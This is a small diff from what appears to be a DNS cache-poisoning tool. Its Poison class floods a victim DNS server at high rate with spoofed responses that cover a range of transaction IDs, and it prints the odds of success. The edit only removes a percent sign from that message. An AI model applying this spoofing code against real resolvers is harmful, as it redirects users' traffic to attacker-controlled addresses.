@@ -99,7 +99,7 @@ class Poison(Thread):
 
             print("Sending packets from {} with id in interval [{:#x}, {:#x}] to {}"
                   .format(self.known_ns_ip, id, id + self.response_amount, victim_dns_ip))
-            print("Chance of success: 1-(1-{:d}/65536)**{:d} = {:.2f}%"
+            print("Chance of success: 1-(1-{:d}/65536)**{:d} = {:.2f}"
                   .format(self.response_amount, counter, 1 - pow((1 - self.response_amount / 65536.), counter)))
 
             sendpfast(packet_list, pps=100000, iface="eth1", verbose=0)
